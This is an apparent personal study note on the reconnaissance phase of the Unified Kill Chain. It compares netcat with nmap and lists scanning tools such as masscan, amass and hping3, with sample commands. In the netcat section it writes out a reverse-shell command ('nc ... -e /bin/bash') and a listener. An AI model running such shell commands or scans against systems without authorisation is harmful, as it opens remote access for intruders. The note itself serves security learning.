---
title: Reconnaissance
draft: false
tags:
  - tag1
  - tag2
  - offensive-security
  - reconnaissance
  - unified-kill-chain
NeedsReview: true
---
# Reconnaissance

> [!abstract] Summary  
> Reconnaissance is the initial phase in the [Unified Kill Chain](Unified%20Kill%20Chain%20(UKC).md), where the attacker gathers information about the target without actively engaging with it.  

This phase is typically divided into two types:

## 🕵️ Passive Reconnaissance

Tools and techniques that don't directly interact with the target systems, thus reducing the chances of detection.

- [Shodan](Shodan.md): Search engine for internet-connected devices.
- [Wappalyzer](Wappalyzer.md): Browser extension or CLI tool to identify technologies used by a target website.

---
## ⚡ Active Reconnaissance

Involves direct interaction with the target, potentially triggering alerts.

### 🔍 **Things `nc` [[Netcat]] Can Do That [[Nmap]] Cannot (or Not Easily)**

**Manual Banner Grabbing / Custom Payloads**
`nc` allows you to **manually connect to a port** and send **custom input** to see how the service responds.
Example:

```bash
echo -e "HEAD / HTTP/1.0\r\n\r\n" | nc target.com 80
```

This is useful for **interacting with obscure or custom services** where `nmap`'s scripts might not work.

---

**Reverse Shells and Bind Shells**

`nc` can be used to **set up reverse or bind shells**, which is useful in post-exploitation or red teaming.

Example:

```bash
nc -lvnp 4444  # Listener
nc target.com 4444 -e /bin/bash  # Reverse shell
```

`nmap` is not designed for this kind of interaction.

---

**Simple TCP/UDP Client**

`nc` can act as a **lightweight TCP or UDP client**, useful for testing connectivity or service behavior.

Example:

```bash
nc -u target.com 53  # UDP DNS port
```

---

**Port Knocking**
You can use `nc` to simulate **port knocking** sequences manually, which `nmap` doesn’t support natively.

---

**File Transfers**
`nc` can be used to **transfer files** between systems over a raw TCP connection.
Example:

``` bash 
# Sender 
nc -l -p 1234 < file.txt 

# Receiver 
nc target.com 1234 > file.txt`
```
---

### 🛠️ What `nmap` Does Better

- **Automated scanning and service detection**
- **OS fingerprinting**
- **Scriptable interactions via NSE (Nmap Scripting Engine)**
- **Network topology mapping**
- **Vulnerability detection**

---

### 🧠 Summary

|Feature|`nc` (Netcat) ✅|`nmap` ✅|
|---|---|---|
|Manual banner grabbing|✅|⚠️ (limited via NSE)|
|Reverse/bind shell|✅|❌|
|File transfer|✅|❌|
|Port scanning|⚠️ (basic)|✅|
|OS/service detection|❌|✅|
|Scriptable enumeration|❌|✅ (NSE)|

---

## 🧰 Other Essential Network Enumeration Tools

### 1. **Masscan**

- **Purpose**: Extremely fast port scanner (like `nmap` but faster).
- **Use Case**: Scanning large IP ranges quickly.
- **Note**: Doesn't do service detection like `nmap`.

``` bash
masscan -p1-65535 192.168.1.0/24 --rate=10000
```

---

### 2. **Netdiscover**

- **Purpose**: ARP-based network discovery tool.
- **Use Case**: Identifying live hosts on a local subnet (great for internal networks).

``` bash
netdiscover -r 192.168.1.0/24
```

---

### 3. **Fping**

- **Purpose**: Fast ICMP ping sweeper.
- **Use Case**: Quickly identify live hosts.

``` bash
fping -a -g 192.168.1.0/24
```


---

### 4. **Hping3**

- **Purpose**: Packet crafting tool.
- **Use Case**: Advanced scanning, firewall testing, and TCP/IP stack auditing.

``` bash
hping3 -S -p 80 -c 1 target.com
```


---

### 5. **ZMap**

- **Purpose**: Internet-wide network scanner.
- **Use Case**: High-speed scanning of large address spaces (used in research).


---

### 6. **Amass**

- **Purpose**: DNS enumeration and attack surface mapping.
- **Use Case**: Subdomain discovery and external asset mapping.

``` bash
amass enum -d example.com
```


---

### 7. **Nessus / OpenVAS**

- **Purpose**: Vulnerability scanners.
- **Use Case**: Deep enumeration of services and known vulnerabilities.



---

### 8. **Recon-ng**

- **Purpose**: Web-based reconnaissance framework.
- **Use Case**: OSINT and passive network enumeration.


---

### 🧠 Summary

| Tool               | Primary Use                      | Strengths                      |
| ------------------ | -------------------------------- | ------------------------------ |
| `nmap`             | Port/service/OS detection        | Versatile, scriptable          |
| `nc`               | Manual interaction, shell access | Lightweight, flexible          |
| `masscan`          | Fast port scanning               | Speed                          |
| `netdiscover`      | Local network discovery          | ARP-based, simple              |
| `fping`            | ICMP sweep                       | Fast, efficient                |
| `hping3`           | Packet crafting                  | Custom scans, firewall testing |
| `zmap`             | Internet-wide scanning           | Research-grade speed           |
| `amass`            | DNS and subdomain enumeration    | External recon                 |
| `Nessus`/`OpenVAS` | Vulnerability scanning           | Deep service analysis          |

--- 

## 🔗 See Also

- [02_Resource Development](02_Resource%20Development.md) *(next stage in the Unified Kill Chain)*
